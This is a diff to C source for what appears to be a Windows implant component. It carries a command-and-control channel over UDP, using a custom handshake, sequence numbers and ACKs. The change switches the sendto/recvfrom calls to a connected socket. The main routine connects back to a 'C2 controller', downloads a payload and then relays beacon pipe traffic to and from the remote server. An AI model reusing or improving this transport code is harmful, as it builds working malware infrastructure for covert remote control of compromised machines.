@@ -98,7 +98,8 @@ SOCKET create_socket(char* ip, char* port, int timeout_sec)
 			return INVALID_SOCKET;
 		}
 
-	// Connect to server.
+	// "Connect" to server.
+	// We can call send/recv with UDP because we are calling connect() here
 	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
 		debug_print("Connection Failure: %ld\n", WSAGetLastError());
@@ -124,15 +125,13 @@ SOCKET create_socket(char* ip, char* port, int timeout_sec)
  * @param sd A socket file descriptor
  * @param data A pointer to an array containing data to send
  * @param len Length of data to send
- * @param SrvAddr SockAddr struct with IP/Port of server
  * @param retries Number of times to retry recv after a timeout
  * @return Number of bytes sent
 */
-int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int retries) {
+int sendData(SOCKET sd, const char* data, DWORD len, int retries) {
 	int socketsReady = 0;
 	int iResult = 0;
 	int error = 0;
-	int SrvAddrSize = sizeof(SrvAddr);
 	int _retries = retries;
 	char* sizepacket = malloc(8);
 	if (sizepacket == NULL)
@@ -150,7 +149,7 @@ int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int re
 	memcpy(sizepacket, &my_seqnum, 4);
 	memcpy((sizepacket+4), &len, 4); 
 	while(_retries > 0) {
-		iResult = sendto(sd, sizepacket, 8, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		iResult = send(sd, sizepacket, 8, 0);
 		if (iResult == SOCKET_ERROR)
 			{
 				debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
@@ -159,7 +158,7 @@ int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int re
 				return(-1);
 			}
 		
-		iResult = recvfrom(sd, ackpacket, 3, 0, (SOCKADDR *)& SrvAddr, &SrvAddrSize);
+		iResult = recv(sd, ackpacket, 3, 0);
 		if (iResult == SOCKET_ERROR)
 		{
 			error = WSAGetLastError();
@@ -212,7 +211,7 @@ int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int re
 		while(_retries > 0) {
 			if (remaining >= PACKET_SIZE) 
 			{
-				temp = sendto(sd, packet, PACKET_SIZE+4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+				temp = send(sd, packet, PACKET_SIZE+4, 0);
 				if (temp == SOCKET_ERROR)
 					{
 						debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
@@ -223,7 +222,7 @@ int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int re
 			} 
 			else 
 			{
-				temp = sendto(sd, packet, remaining+4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+				temp = send(sd, packet, remaining+4, 0);
 				if (temp == SOCKET_ERROR)
 					{
 						debug_print("sendto in sendData failed with error %d\n", WSAGetLastError());
@@ -235,7 +234,7 @@ int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int re
 			
 			debug_print("sent: %d bytes\n", temp);
 			
-			iResult = recvfrom(sd, ackpacket, 3, 0, (SOCKADDR *)& SrvAddr, &SrvAddrSize);
+			iResult = recv(sd, ackpacket, 3, 0);
 			if (iResult == SOCKET_ERROR)
 			{
 				error = WSAGetLastError();
@@ -287,15 +286,13 @@ int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int re
  * @param sd A socket file descriptor
  * @param buffer Buffer to store data in
  * @param max unused
- * @param SrvAddr SockAddr struct with IP/Port of server
  * @param retries Number of times to retry recv after a timeout
  * @return Size of data recieved
 */
-DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int retries) {
+DWORD recvData(SOCKET sd, char * buffer, DWORD max, int retries) {
 	debug_print("%s", "Receiving Data\n");
 	DWORD size = 0, total = 0, temp = 0, seqnum = 0;
 	int iResult = 0;
-	int SrvAddrSize = sizeof(SrvAddr);
 	int _retries = retries;
 	int error = 0;
 
@@ -308,7 +305,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
 
 	/* read the 4-byte length */
 	while (_retries > 0) {
-		iResult = recvfrom(sd, sizePacket, 8, 0, (SOCKADDR *)& SrvAddr, &SrvAddrSize);
+		iResult = recv(sd, sizePacket, 8, 0);
 		if (iResult == SOCKET_ERROR)
 		{
 			error = WSAGetLastError();
@@ -325,7 +322,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
 
 		seqnum = *((DWORD*)sizePacket);
 		if (seqnum <= server_seqnum) {
-			iResult = sendto(sd, "ACK", 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+			iResult = send(sd, "ACK", 4, 0);
 			if (iResult == SOCKET_ERROR)
 			{
 				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
@@ -365,7 +362,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
 	//TODO: Double check the logic here to make sure we can recv everything we need to.
 	// Old note said "No danger of reading more than a single packet, as UDP sockets store disjoint datagrams."
 	while (_retries > 0 && total < size) {
-		temp = recvfrom(sd, packet, PACKET_SIZE+4, 0, (SOCKADDR *)& SrvAddr, &SrvAddrSize);
+		temp = recv(sd, packet, PACKET_SIZE+4, 0);
 		if (temp == SOCKET_ERROR)
 		{
 			error = WSAGetLastError();
@@ -384,7 +381,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
 		debug_print("seqnum: %d\n", seqnum);
 		if (seqnum <= server_seqnum)
 		{
-			iResult = sendto(sd, "ACK", 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+			iResult = send(sd, "ACK", 4, 0);
 			if (iResult == SOCKET_ERROR)
 			{
 				debug_print("sendto in recvData failed with error %d\n", WSAGetLastError());
@@ -424,14 +421,12 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
  * Initiate connection with server via a UDP three-way handshake
  * 
  * @param sd A socket file descriptor
- * @param SrvAddr SockAddr struct with IP/Port of server
  * @param retries Number of times to retry recv after a timeout
  * @return Return 0 on success
  */
-int threeWayHandshake(SOCKET sd, SOCKADDR_IN SrvAddr, int retries) {
+int threeWayHandshake(SOCKET sd, int retries) {
 	int _retries = retries;
 	int iResult = 0;
-	int SrvAddrSize = sizeof(SrvAddr);
 	int error = 0;
 	char* synack = calloc(4, 1);
 	if (synack == NULL)
@@ -440,14 +435,14 @@ int threeWayHandshake(SOCKET sd, SOCKADDR_IN SrvAddr, int retries) {
 		return(-1);
 	}
 	while (_retries > 0) {
-		iResult = sendto(sd, (char *)&my_seqnum, 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+		iResult = send(sd, (char *)&my_seqnum, 4, 0);
 		if (iResult == SOCKET_ERROR)
 		{
 			debug_print("sendto in threeWayHandshake failed with error %d\n", WSAGetLastError());
 			free(synack);
 			return(-1);
 		}
-		iResult = recvfrom(sd, synack, 4, 0, (SOCKADDR *)& SrvAddr, &SrvAddrSize);
+		iResult = recv(sd, synack, 4, 0);
 		if (iResult == SOCKET_ERROR)
 		{
 			error = WSAGetLastError();
@@ -472,7 +467,7 @@ int threeWayHandshake(SOCKET sd, SOCKADDR_IN SrvAddr, int retries) {
 		free(synack);
 		return(-1);
 	}
-	iResult = sendto(sd, "ACK", 4, 0, (SOCKADDR *)& SrvAddr, sizeof(SrvAddr));
+	iResult = send(sd, "ACK", 4, 0);
 	if (iResult == SOCKET_ERROR)
 	{
 		debug_print("sendto in threeWayHandshake failed with error %d\n", WSAGetLastError());
@@ -561,11 +556,6 @@ void main(int argc, char* argv[])
 	char* payloadData = NULL;
 	HANDLE beaconPipe = INVALID_HANDLE_VALUE;
 
-	SOCKADDR_IN SrvAddr;
-	SrvAddr.sin_family = AF_INET;
-	SrvAddr.sin_port = htons(atoi(PORT));
-	SrvAddr.sin_addr.s_addr = inet_addr(IP);
-
 	int iResult = 0;
 
 	// Create a connection back to our C2 controller
@@ -580,7 +570,7 @@ void main(int argc, char* argv[])
 	debug_print("%s", "Socket Created\n");
 
 	// run 3-way handshake with beacon
-	iResult = threeWayHandshake(sockfd, SrvAddr, RETRIES);
+	iResult = threeWayHandshake(sockfd, RETRIES);
 	if (iResult != 0)
 	{
 		debug_print("%s", "threeWayHandshake returned error\n");
@@ -598,7 +588,7 @@ void main(int argc, char* argv[])
 		exit(1);
 	}
 
-	DWORD payload_size = recvData(sockfd, payload, PAYLOAD_MAX_SIZE, SrvAddr, RETRIES);
+	DWORD payload_size = recvData(sockfd, payload, PAYLOAD_MAX_SIZE, RETRIES);
 	if (payload_size < 0)
 	{
 		debug_print("%s", "recvData error, exiting\n");
@@ -652,7 +642,7 @@ void main(int argc, char* argv[])
 			Sleep(sleep*1000);
 		}
 
-		int send_size = sendData(sockfd, buffer, read_size, SrvAddr, RETRIES);
+		int send_size = sendData(sockfd, buffer, read_size, RETRIES);
 		if (send_size < 0)
 		{
 			debug_print("%s", "sendData error, exiting\n");
@@ -660,7 +650,7 @@ void main(int argc, char* argv[])
 		}
 		debug_print("%s", "Sent to TS\n");
 		
-		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE, SrvAddr, RETRIES);
+		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE, RETRIES);
 		if (read_size <= 0)
 		{
 			debug_print("%s", "recvData error, exiting\n");
